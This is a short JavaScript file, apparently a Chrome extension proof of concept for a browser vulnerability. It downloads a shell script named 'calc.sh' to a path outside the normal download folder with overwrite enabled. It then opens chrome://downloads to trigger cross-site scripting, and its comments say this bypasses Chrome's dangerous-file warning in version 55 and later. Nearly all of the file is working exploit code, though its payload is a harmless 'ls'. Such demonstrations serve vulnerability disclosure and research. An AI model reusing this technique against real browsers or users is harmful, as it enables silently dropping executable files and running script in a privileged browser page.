"use strict"
var myDownloadId
chrome.downloads.onChanged.addListener(function(downloadDelta) {
	if (
		downloadDelta.id !== myDownloadId ||
		!downloadDelta.state ||
		downloadDelta.state.current !== "complete"
	) {
		console.log("Ignored incomplete or non-relevant download", downloadDelta)
		return
	}
	// Completed. Now open chrome://downloads to perform XSS.
	chrome.tabs.create({
		url: "chrome://downloads"
	})
})

// This will most likely require a confirmation because of the dangerous file type.
// In Chrome 55+, the browser trusts chrome://downloads to bypass the warning.
// In Chrome 54-, a prompt may be shown.
chrome.downloads.download({
	url: "data:,ls",
	filename: "/hello/calc.sh",
	conflictAction: "overwrite",
	saveAs: false
})

// This is always going to be approved.
chrome.downloads.download(
	{
		url: "data:,completelysafefile",
		filename: "harmless.txt",
		conflictAction: "overwrite",
		saveAs: false
	},
	function(downloadId) {
		myDownloadId = downloadId
	}
)
